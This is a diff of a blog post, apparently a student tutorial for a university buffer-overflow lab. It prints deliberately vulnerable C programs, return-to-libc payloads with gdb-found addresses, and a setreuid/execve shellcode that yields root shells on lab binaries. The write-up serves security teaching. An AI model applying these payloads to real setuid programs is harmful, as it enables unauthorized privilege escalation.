@@ -1,7 +1,16 @@
+---
+layout: post
+title:  "Computer Security Stack Lab Tutorial"
+date:   2017-01-31
+desc: "A tutorial to Computer Security Stack Lab"
+keywords: "Security,School,blog,tutorial"
+categories: [School]
+tags: [Security,School]
+icon: icon-html
+---
+
 <h1 id="computer-security-stack-lab">Computer Security Stack Lab</h1>
-
 <p>Stage:</p>
-
 <ul>
 <li><a href="#overflow1">overflow1</a></li>
 <li><a href="#overflow2">overflow2</a></li>
@@ -11,19 +20,11 @@
 
 <p>The stages of stacklab is hosted on individual host on emory mainframe host. The purpose of this lab is to understand and use buffer overflow and shell code injection to compromise vulnerable programs, especially with unsafe buffer copy.</p>
 
-
-
 <h2 id="overflow1"><span>overflow1</span></h2>
-
 <p>This is too easy. </p>
 
-
-
 <h2 id="overflow2"><span>overflow2</span></h2>
-
 <p>The second stage was meant to be about alphanumeric shell code. </p>
-
-
 
 <pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-comment">/* Property of USER */</span>
 
@@ -33,38 +34,39 @@
 <span class="hljs-preprocessor">#include &lt;string.h&gt;</span>
 <span class="hljs-preprocessor">#include &lt;ctype.h&gt;</span>
 
-
 <span class="hljs-keyword">void</span> lolcat(<span class="hljs-keyword">char</span> *meow, <span class="hljs-keyword">char</span> *arg, <span class="hljs-keyword">char</span> *woof)
 {
         <span class="hljs-keyword">char</span> buf[<span class="hljs-number">185</span>];
         <span class="hljs-keyword">int</span> i;
 
-        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(meow) &gt; <span class="hljs-number">16</span>)
-        {
-                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 1 iz too long!\n"</span>);
-                <span class="hljs-keyword">return</span>;
-        }
+```
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(meow) &gt; <span class="hljs-number">16</span>)
+    {
+            <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 1 iz too long!\n"</span>);
+            <span class="hljs-keyword">return</span>;
+    }
 
-        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(arg); i++)
-        {
-                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span> (arg[i]))
-                {
-                        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 2 iz tainted!\n"</span>);
-                        <span class="hljs-keyword">return</span>;
-                }
-        }
-        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(woof) &gt; <span class="hljs-number">16</span>)
-        {
-                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 3 iz too long!\n"</span>);
-                <span class="hljs-keyword">return</span>;
-        }
+    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(arg); i++)
+    {
+            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span> (arg[i]))
+            {
+                    <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 2 iz tainted!\n"</span>);
+                    <span class="hljs-keyword">return</span>;
+            }
+    }
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(woof) &gt; <span class="hljs-number">16</span>)
+    {
+            <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Argument 3 iz too long!\n"</span>);
+            <span class="hljs-keyword">return</span>;
+    }
 
-        <span class="hljs-built_in">sprintf</span> (buf, <span class="hljs-string">"HAI HACKER. U SAYS %s%s%s"</span>, meow, arg, woof);
-        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"U WRAITES %d BAITES\n"</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-built_in">strlen</span>(buf));
+    <span class="hljs-built_in">sprintf</span> (buf, <span class="hljs-string">"HAI HACKER. U SAYS %s%s%s"</span>, meow, arg, woof);
+    <span class="hljs-built_in">printf</span> (<span class="hljs-string">"U WRAITES %d BAITES\n"</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-built_in">strlen</span>(buf));
 
-        <span class="hljs-keyword">return</span>;
+    <span class="hljs-keyword">return</span>;
+```
+
 }
-
 
 <span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;
 
@@ -89,15 +91,17 @@
                         <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>;
         }
 
-        lolcat (argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);
+```
+    lolcat (argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);
 
-        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"KTHXBYE.\n"</span>);
+    <span class="hljs-built_in">printf</span> (<span class="hljs-string">"KTHXBYE.\n"</span>);
 
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+```
+
 </code></pre>
 
 <p>The program takes three parameters, and uses three methods to ensure certain conditions. </p>
-
 <ul>
 <li>The first argument can be in any form as long as it doesn’t exceed 16 char</li>
 <li>The second argument has to be alphanumeric, meaning it can only includes [A-Z][a-z][0-9]</li>
@@ -105,9 +109,7 @@
 </ul>
 
 <p>So apparently, we are supposed to work with alphanumeric shellcode, with the help of tools like metasploit. However, I will introduce a detour to work around the alphanumeric restraint (cause I am not an expert in that and there is a much better tutorial <a href="http://note.heron.me/2014/11/alphanumeric-shellcode-of-execbinsh.html?m=1">Here</a>  ).</p>
-
 <p>The third argument is where we will actually overflow the buffer and rewrite the return address. 16 byte can be put to great use if we organize it carefully. The basic idea is a return-to-libc exploit: we want to jump to the execution of <code>system("/bin/sh")</code> somewhere in the memory. So we will need three addresses:</p>
-
 <ul>
 <li>The address of <code>system()</code></li>
 <li>The address of string <code>/bin/sh</code></li>
@@ -134,8 +136,6 @@ Why is this exploit available? Recall the structure of the memory stack when the
 
 <p>We can easily push the address of <code>system()</code> and <code>exit()</code> to the stack, and the string <code>/bin/sh</code> as an argument, and these three addresses can be easily found inside <code>gdb</code>, you gotta know how to use this powerful debugger.</p>
 
-
-
 <pre class="prettyprint"><code class=" hljs ruby">user<span class="hljs-variable">@host</span><span class="hljs-symbol">:/c0re</span><span class="hljs-variable">$ </span>gdb overflow2
 
 (gdb) unset env <span class="hljs-constant">LINES</span>
@@ -145,15 +145,11 @@ Why is this exploit available? Recall the structure of the memory stack when the
 
 <p>Remember the variables on the memory stack is not loaded until you run the program, so we can first just feed some random input to the program to extract our address.</p>
 
-
-
 <pre class="prettyprint"><code class=" hljs mel">(gdb) run <span class="hljs-variable">$(</span><span class="hljs-keyword">python</span> -c <span class="hljs-string">'print "\x90 "*3'</span>)
 Starting program: /c0re/attackme2 <span class="hljs-variable">$(</span><span class="hljs-keyword">python</span> -c <span class="hljs-string">'print "\x90 "*3'</span>)
 Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x080485e4</span> <span class="hljs-keyword">in</span> lolcat ()</code></pre>
 
 <p>We already know the two system call <code>system()</code> and <code>exit()</code> must be somewhere on the stack stored with variable names <code>system</code> and <code>exit</code>, we can just do:</p>
-
-
 
 <pre class="prettyprint"><code class=" hljs perl">(gdb) p <span class="hljs-keyword">system</span>
 <span class="hljs-variable">$1</span> = {&lt;text variable, <span class="hljs-keyword">no</span> debug info&gt;} <span class="hljs-number">0xf7e4c840</span> &lt;<span class="hljs-keyword">system</span>&gt;
@@ -163,16 +159,12 @@ Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x08048
 
 <p>How about the address of the string <code>"/bin/sh"</code>? If the environment variable isn’t cleared out buffer overflow we can make use of it. However, this smart programmer somehow wrote a program to defend against injection through environment table but not a buffer overflow. OK. Let’s just do a search in <code>gdb</code></p>
 
-
-
 <pre class="prettyprint"><code class=" hljs livecodeserver">(gdb) find &amp;<span class="hljs-keyword">system</span>,+<span class="hljs-number">9999999</span>,<span class="hljs-string">"/bin/sh"</span>
 <span class="hljs-number">0xf7f6ed48</span>
 warning: Unable <span class="hljs-built_in">to</span> access <span class="hljs-number">16000</span> <span class="hljs-keyword">bytes</span> <span class="hljs-operator">of</span> target memory <span class="hljs-keyword">at</span> <span class="hljs-number">0xf7fc8ad0</span>, halting search.
 <span class="hljs-number">1</span> pattern found.</code></pre>
 
 <p>LOL that was easy. Now we have the three addresses. </p>
-
-
 
 <pre class="prettyprint"><code class=" hljs perl"> <span class="hljs-number">1</span>. <span class="hljs-keyword">system</span>():<span class="hljs-number">0xf7e4c840</span>
  <span class="hljs-number">2</span>. <span class="hljs-keyword">exit</span>():<span class="hljs-number">0xf7e407f0</span> 
@@ -195,79 +187,77 @@ root
 
 <p>Easy right?</p>
 
-
-
 <h2 id="overflow3"><span>overflow3</span></h2>
-
 <p>The third stage is a little bit trickier, but it follows the same idea of stage 1. Let’s first look at the source program with bug.There are 2 functions that we are interested in , namely  <code>zerg()</code> and <code>farmville()</code></p>
-
-
 
 <pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-keyword">int</span> zerg(<span class="hljs-keyword">char</span> *arg)
 {
         <span class="hljs-keyword">char</span> buf[<span class="hljs-number">12</span>];
         <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> i, sum;
 
-        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span> (arg) &gt; <span class="hljs-number">24</span>) <span class="hljs-comment">/* Argument too long! */</span>
-        {
-                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] String too long!\n"</span>);
-                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
-        }
+```
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span> (arg) &gt; <span class="hljs-number">24</span>) <span class="hljs-comment">/* Argument too long! */</span>
+    {
+            <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] String too long!\n"</span>);
+            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
+    }
 
-        <span class="hljs-comment">/* Compute checksum */</span>
-        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, sum = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(arg); i++)
-                sum += (<span class="hljs-keyword">int</span>)arg[i];
+    <span class="hljs-comment">/* Compute checksum */</span>
+    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, sum = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(arg); i++)
+            sum += (<span class="hljs-keyword">int</span>)arg[i];
 
-        <span class="hljs-keyword">if</span> ( (sum &amp; <span class="hljs-number">0xff</span>) != <span class="hljs-number">0</span>)
-        {
-                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] Sum of incoming buffer is not divisible by 256 :-(\n"</span>);
-                <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
-        }
+    <span class="hljs-keyword">if</span> ( (sum &amp; <span class="hljs-number">0xff</span>) != <span class="hljs-number">0</span>)
+    {
+            <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] Sum of incoming buffer is not divisible by 256 :-(\n"</span>);
+            <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
+    }
 
-        <span class="hljs-comment">/* Check the first 10 characters */</span>
-        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span> (arg, <span class="hljs-string">"RUSHKEKEKE"</span>, <span class="hljs-number">10</span>))
-        {
-                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] No warning issued for the incoming Zergling rush :-(\n"</span>);
-                <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
-        }
+    <span class="hljs-comment">/* Check the first 10 characters */</span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span> (arg, <span class="hljs-string">"RUSHKEKEKE"</span>, <span class="hljs-number">10</span>))
+    {
+            <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] No warning issued for the incoming Zergling rush :-(\n"</span>);
+            <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
+    }
 
-        <span class="hljs-built_in">strcpy</span> (buf, arg);
+    <span class="hljs-built_in">strcpy</span> (buf, arg);
 
-        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] Buffer received %d characters!\n"</span>, <span class="hljs-built_in">strlen</span>(buf));
+    <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] Buffer received %d characters!\n"</span>, <span class="hljs-built_in">strlen</span>(buf));
 
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+```
+
 }
-
 
 <span class="hljs-keyword">int</span> farmville(<span class="hljs-keyword">void</span>)
 {
         <span class="hljs-keyword">char</span> buf[<span class="hljs-number">227</span>];
         <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> i, sum = <span class="hljs-number">0</span>, c;
 
-        <span class="hljs-keyword">while</span> ( (c = getc(stdin)) != EOF)
-        {
-                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">'\n'</span>)
-                        <span class="hljs-keyword">break</span>;
-                buf[i++] = c;
-        }
+```
+    <span class="hljs-keyword">while</span> ( (c = getc(stdin)) != EOF)
+    {
+            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">'\n'</span>)
+                    <span class="hljs-keyword">break</span>;
+            buf[i++] = c;
+    }
 
-        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++)
-                sum += (<span class="hljs-keyword">int</span>)buf[i];
+    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++)
+            sum += (<span class="hljs-keyword">int</span>)buf[i];
 
-        <span class="hljs-keyword">if</span> ( (sum &amp; <span class="hljs-number">0xff</span>) != <span class="hljs-number">0</span>)
-        {
-                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[FARMVILLE] Sum of incoming buffer is not divisible by 256 :-(\n"</span>);
-                <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
-        }
+    <span class="hljs-keyword">if</span> ( (sum &amp; <span class="hljs-number">0xff</span>) != <span class="hljs-number">0</span>)
+    {
+            <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[FARMVILLE] Sum of incoming buffer is not divisible by 256 :-(\n"</span>);
+            <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
+    }
 
-        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[FARMVILLE] Spammed the walls of %d Facebook friends!\n"</span>, <span class="hljs-built_in">strlen</span>(buf));
+    <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[FARMVILLE] Spammed the walls of %d Facebook friends!\n"</span>, <span class="hljs-built_in">strlen</span>(buf));
 
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+```
+
 }</code></pre>
 
 <p>Notice that both <code>zerg()</code> and <code>farmville()</code> have some kind of buffer overflow vulnerabilities. <code>strcpy (buf, arg)</code> a straightforward string copy without character checking  and </p>
-
-
 
 <pre class="prettyprint"><code class="language-C hljs perl"><span class="hljs-keyword">while</span> ( (c = <span class="hljs-keyword">getc</span>(stdin)) != EOF)
         {
@@ -277,37 +267,37 @@ root
         }</code></pre>
 
 <p>a bit-by-bit copy without bound checking. </p>
-
 <p>However, <code>zerg()</code> only reserve us 12 bits to manipulate <code>char buf[12]</code>, while <code>farmville()</code> is far more generous <code>char buf[227]</code>. Moreover, in <code>main()</code>, <code>farmville()</code> never get called explicitly. </p>
-
-
 
 <pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)
 {
         <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;
 
-        <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)
-        {
-                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Need exactly one argument\n"</span>);
-                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
-        }
-        <span class="hljs-comment">/* Clear all environment variables so people don't sneak nasty things into my memory &gt;:( */</span>
-        <span class="hljs-keyword">while</span> (environ[i])
-        {
-                <span class="hljs-built_in">memset</span> (environ[i], <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(environ[i]));
-                i++;
-        }
-        clearenv();
+```
+    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)
+    {
+            <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Need exactly one argument\n"</span>);
+            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
+    }
+    <span class="hljs-comment">/* Clear all environment variables so people don't sneak nasty things into my memory &gt;:( */</span>
+    <span class="hljs-keyword">while</span> (environ[i])
+    {
+            <span class="hljs-built_in">memset</span> (environ[i], <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(environ[i]));
+            i++;
+    }
+    clearenv();
 
-        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">0</span>]); i++)
-        {
-                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span> (argv[<span class="hljs-number">0</span>][i]) &amp;&amp; <span class="hljs-built_in">strchr</span>(<span class="hljs-string">"-_/"</span>,argv[<span class="hljs-number">0</span>][i]) == NULL)
-                        <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>;
-        }
+    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">0</span>]); i++)
+    {
+            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span> (argv[<span class="hljs-number">0</span>][i]) &amp;&amp; <span class="hljs-built_in">strchr</span>(<span class="hljs-string">"-_/"</span>,argv[<span class="hljs-number">0</span>][i]) == NULL)
+                    <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>;
+    }
 
-        zerg (argv[<span class="hljs-number">1</span>]);
+    zerg (argv[<span class="hljs-number">1</span>]);
 
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+```
+
 }</code></pre>
 
 <p>So our strategy is now intuitive. We will overflow the <code>zerg()</code> buffer, overwrite the return address to the address of <code>farmville()</code>, and then exploit the buffer. You may wonder how we feed a second shellcode into the <code>farmville()</code> without extensively manipulating the stack pointers. Luckily enough, the input of <code>farmville()</code> is conveniently from <code>stdin</code>, like <code>c = getc(stdin)</code>. So we can just pipe our two exploit scripts through commandline argument and <code>stdin</code> seperately, something like <code>(cat farmville.sol ; cat) | /c0re/overflow3 "$( &lt; zerg.sol)"</code> <br>
@@ -403,9 +393,7 @@ aaaaaaaa
 [FARMVILLE] Sum <span class="hljs-keyword">of</span> incoming <span class="hljs-keyword">buffer</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> divisible by <span class="hljs-number">256</span> :-(</code></pre>
 
 <p>Yayyyy! It entered the <code>farmville()</code>. Note, cause we didn’t feed anything into the <code>stdin</code>, the program asked us for input after <code>farmville()</code> is called. </p>
-
 <p>Now it’s time to crack the <code>farmville()</code> function. </p>
-
 <p>Some preparation first： <br>
 We will need the shellcode that do <code>setreuid(geteuid, geteuid)</code>  and  <code>execve(/bin/sh)</code>  to give us root access in shell. The 39-byte shellcode is as follow: <br>
 <code>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd <br>
@@ -417,8 +405,6 @@ And buffer length: 228 <br>
 $5 = 228</code></p>
 
 <p>There is only one criteria that <code>farmville()</code> required from our payload:</p>
-
-
 
 <pre class="prettyprint"><code class="language-C hljs bash"><span class="hljs-keyword">if</span> ( (sum &amp; <span class="hljs-number">0</span>xff) != <span class="hljs-number">0</span>)
         {
@@ -463,13 +449,8 @@ uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">1030<
 
 <p>Great! We compromise the program and gain root access in shell! </p>
 
-
-
 <h2 id="overflow4"><span>overflow4</span></h2>
-
 <p>This time we are limited with the length of input, the source code looks like this:</p>
-
-
 
 <pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-comment">/* Betrayal */</span>
 
@@ -479,24 +460,25 @@ uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">1030<
 <span class="hljs-preprocessor">#include &lt;string.h&gt;</span>
 <span class="hljs-preprocessor">#include &lt;ctype.h&gt;</span>
 
-
 <span class="hljs-keyword">void</span> brutus(<span class="hljs-keyword">char</span> *caesar)
 {
         <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];
 
-        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(caesar) &gt; <span class="hljs-number">20</span>)
-        {
-                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Et tu, Brute?\n"</span>);
-                <span class="hljs-keyword">return</span>;
-        }
+```
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(caesar) &gt; <span class="hljs-number">20</span>)
+    {
+            <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Et tu, Brute?\n"</span>);
+            <span class="hljs-keyword">return</span>;
+    }
 
-        <span class="hljs-built_in">strcpy</span> (buf, caesar);
+    <span class="hljs-built_in">strcpy</span> (buf, caesar);
 
-        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Alea iacta est: %d\n"</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-built_in">strlen</span>(buf));
+    <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Alea iacta est: %d\n"</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-built_in">strlen</span>(buf));
 
-        <span class="hljs-keyword">return</span>;
+    <span class="hljs-keyword">return</span>;
+```
+
 }
-
 
 <span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;
 
@@ -521,9 +503,11 @@ uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">1030<
                         <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>;
         }
 
-        brutus(argv[<span class="hljs-number">1</span>]);
+```
+    brutus(argv[<span class="hljs-number">1</span>]);
 
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+```
 
 }
 </code></pre>
@@ -555,8 +539,6 @@ warning: Unable <span class="hljs-built_in">to</span> access <span class="hljs-n
 <span class="hljs-number">1</span> pattern found.</code></pre>
 
 <p>Craft our payload.</p>
-
-
 
 <pre class="prettyprint"><code class=" hljs tex">user@host:/c0re<span class="hljs-formula">$ /c0re/attackme4 $</span>(python -c 'print "<span class="hljs-command">\x</span>90"*8 + "<span class="hljs-command">\x</span>40<span class="hljs-command">\xc</span>8<span class="hljs-command">\xe</span>4<span class="hljs-command">\xf</span>7<span class="hljs-command">\xf</span>0<span class="hljs-command">\x</span>07<span class="hljs-command">\xe</span>4<span class="hljs-command">\xf</span>7<span class="hljs-command">\x</span>48<span class="hljs-command">\xed</span><span class="hljs-command">\xf</span>6<span class="hljs-command">\xf</span>7"')
 Alea iacta est: 20
